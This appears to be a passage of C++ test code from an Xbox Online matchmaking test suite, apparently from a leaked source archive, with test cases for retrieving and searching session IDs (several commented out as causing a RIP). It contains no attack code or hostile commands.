	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionGetID  failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSessionGetID  returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hMatch);
*/

/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Get session ID for a session that hasn't yet been sent to server");
	// -----------------------------------------------------------------

	hMatch = NULL;
	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 0, 0, hEvent, &hMatch );

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionGetID (hMatch, &SessionID);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionGetID  returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionGetID  failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSessionGetID  returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hMatch);
*/

/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Get session ID for a session that has been sent but hasn't completed");
	// -----------------------------------------------------------------

	hMatch = NULL;
	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 0, 0, hEvent, &hMatch );

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = XOnlineMatchSessionGetID (hMatch, &SessionID);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionGetID  returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionGetID  failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSessionGetID  returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hMatch);
*/


	// -----------------------------------------------------------------
	START_TESTCASE("Get session ID with a completed session creation handle");
	// -----------------------------------------------------------------

	hMatch = NULL;
	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 0, 0, hEvent, &hMatch );

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSessionGetID (hMatch, &SessionID);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionGetID  returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionGetID  failed unexpectedly");
	}
	else if(*((ULONGLONG *) &SessionID) == 0)
	{
		FAIL_TESTCASE("XOnlineMatchSessionGetID  returned success but didn't return session ID");
	}

	PASS_TESTCASE("XOnlineMatchSessionGetID  returned valid session ID");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);



	// -----------------------------------------------------------------
	START_TESTCASE("Get session ID with a completed session modification handle");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, NULL, 0, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to modify");
	}

	hr = XOnlineMatchSessionCreate(SessionID, 0, 0, hEvent, &hMatch );

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSessionGetID (hMatch, &NewSessionID);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionGetID  returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionGetID  failed unexpectedly");
	}
	else if(memcmp(&NewSessionID, &SessionID, sizeof(XNKID)))
	{
		FAIL_TESTCASE("XOnlineMatchSessionGetID  returned success but session ID was unexpected");
	}

	PASS_TESTCASE("XOnlineMatchSessionGetID  returned expected session ID");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);



	// -----------------------------------------------------------------
	START_TESTCASE("Get session ID with a reused session creation handle");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 0, 0, hEvent, &hMatch );

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSessionGetID (hMatch, &SessionID);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionGetID  returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionGetID  failed unexpectedly");
	}
	else if(*((ULONGLONG *) &SessionID) == 0)
	{
		FAIL_TESTCASE("XOnlineMatchSessionGetID  returned success but didn't return session ID");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSessionGetID (hMatch, &NewSessionID);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionGetID  returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionGetID  failed unexpectedly");
	}
	else if(memcmp(&NewSessionID, &SessionID, sizeof(XNKID)))
	{
		FAIL_TESTCASE("XOnlineMatchSessionGetID  returned success but session ID was unexpected");
	}

	PASS_TESTCASE("XOnlineMatchSessionGetID  returned expected session ID");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);

Exit:
	if(hEvent)
		CloseHandle(hEvent);

	if(!fCompleted && hMatch)
		XOnlineTaskClose(hMatch);

	return hr;
} // XMatchTest_GetSessionID


} // namespace XMatchTestNamespace
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\core\findfromid.cpp ===
//==================================================================================
// Includes
//==================================================================================
#include "xmatchtest.h"

using namespace XMatchTestNamespace;

namespace XMatchTestNamespace {

//==================================================================================
// Prototypes
//==================================================================================
HRESULT XMatchTest_FindSessionFromID(HANDLE hLog);

//==================================================================================
// XMatchTest_FindSessionFromID
//----------------------------------------------------------------------------------
//
// Description: Contains test cases for creating searches for a specific session ID
//
// Arguments:
//	HANDLE hLog		Handle to logging subsystem
//
// Returns: S_OK if the act of running the test was successful (not whether the
//			test itself was successful), the error code otherwise.
//==================================================================================
HRESULT XMatchTest_FindSessionFromID(HANDLE hLog, XONLINETASK_HANDLE hLogon)
{
	PXMATCH_SEARCHRESULT *ppSearchResults = NULL;
	XONLINETASK_HANDLE hSearch = NULL;
	XNADDR LocalXnAddr;
	XNKID SessionID;
	HRESULT hr = E_FAIL;
    HANDLE hEvent = NULL;
    DWORD dwPollCounter = 0, dwAddrStatus = 0, dwNumResults = 0;
	BOOL fCompleted = FALSE, fDone = FALSE;

	memset(&SessionID, 0, sizeof(SessionID));

	dwAddrStatus = XNetGetTitleXnAddr(&LocalXnAddr);
	if(dwAddrStatus == XNET_GET_XNADDR_PENDING)
		xLog(hLog, XLL_FAIL, "Local address still pending, some tests will fail.");
	else if(dwAddrStatus & XNET_GET_XNADDR_NONE)
		xLog(hLog, XLL_FAIL, "Local address not available, some tests will fail.");

	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!hEvent)
		goto Exit;

/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Find session from ID with NULL task handle");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, NULL, 0, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSessionFindFromID(SessionID, hEvent, NULL);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionFindFromID returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionFindFromID failed as expected");
	}
	else
	{
		XOnlineTaskClose(hSearch);
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSessionFindFromID retu